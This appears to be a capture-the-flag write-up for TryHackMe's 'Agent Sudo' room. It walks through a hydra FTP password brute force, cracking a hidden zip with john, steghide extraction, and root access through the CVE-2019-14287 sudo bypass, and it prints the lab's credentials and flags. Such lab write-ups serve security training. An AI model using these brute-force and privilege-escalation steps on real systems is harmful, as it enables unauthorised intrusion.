# Agent Sudo

![Logo](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/5f59219d-e80c-4ab9-a2b5-b67ded75b5e3)

## Enumeration

Let's enumerate the machine with nmap

```bash
nmap -sT -sV 10.10.52.49
```

![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/e056fada-cec3-472c-92f8-e78987ef27cd)

we brows to web server on port `80` :

![firstPage](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/810ff7da-99a0-4ae6-aa56-6c7adaeeb214)

we see that the page needs user-agent to access the site and `R` is agent that wrote this message

we can infere that other agents codenames are like this, try accessing the website with curl command and user agent

if we set user-agent to `A` or `B` nothing happens, but setting user-agent as `C` will show a different message :

```bash
curl http://10.10.52.49/ -H 'user-agent: C' -L
```

`-L` is for following redirects :

![userAgent](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/403f2967-e34f-46b2-b077-1c49946d7b38)

we can see this is a message to user `chris`, so we can brute force the ftp login with this user :

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.52.49 ftp -v
```

yes, hydra finds the password :

![hydra](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/55dcb21c-d77f-4cf5-8a5f-40184a691fc8)

login to ftp server with this credential : `chris:crystal` and use `dir` to show the content, download all the files there.

![ftp](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/49494c20-cb95-4718-ba24-4b397c081e5c)

cat the content of `To_agentJ.txt` file :

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

so we find out that the login password is in the fake picture, let's examin the pictures

we start by examining `cutie.png`

```bash
binwalk -e cutie.png --run-as=root
```
there is a zip file inside and it is password protected.

use `zip2john` to brute force the password :

```bash
zip2john cutie.png > hash.txt
```
and the use it in `john` :

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![zipPass](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/fa83858b-c463-48c3-adff-0af0763b04bc)

use this password to open the zip file :

```bash
7za x 8702.zip
```
and open the `To_agentR.txt` :

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

the string `QXJlYTUx` is a base64 encoded so we need to decode it :

```bash
echo -n 'QXJlYTUx' | base64 -d

Area51
```

Let's examin the `cute-alien.jpg` picture :

```bash
steghide info cute-alien.jpg
```

it needs a password, use `Area51` password which we found in the zip file of `cutie.png` :

```bash
steghide extract -sf cute-alien.jpg
```

there is a file call `message.txt` inside, open it :

```text
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

from this message we understand that the password of user `james` is `hackerrules!`

yes we can now ssh to machine with these credentials `james:hackerrules!`

now, cat the user.txt file here :

```bash
cat user_flag.txt

b03d975e8c92a7c04146cfa7a5a313c7
```

and download the `Alien_autospy.jpg` file to your machine using scp :

```bash
scp james@10.10.52.49:Alien_autospy.jpg /root
```

for the question `What is the incident of the photo called?` is used the hint and then used this google dork :

```text
Alien autospy site:foxnews.com
```

and the first link gives you the anwer `Roswell alien autopsy`.


## Privilege Escalation

use `sudo -l` to see if any sudo permissions is set for user james :

```bash
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

emmmm!!, now we can use /bin/bash as root but wait, this is suspicious, lets check the sudo version with `sudo -V` :

```bash
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

just search for the vulnerabilities of this version in exploit db or google search the `(ALL, !root) /bin/bash` exploits :

you will find the `CVE-2019-14287` for this sudo version and the exploit is :

```bash
sudo -u#-1 /bin/bash
```

![exploit](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/4ef94669-139d-42b8-8586-69dfe2f2ff4e)

cat the content of `/root/root.txt` :

```text
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

and with the above text we see that Agent R is Deskel.
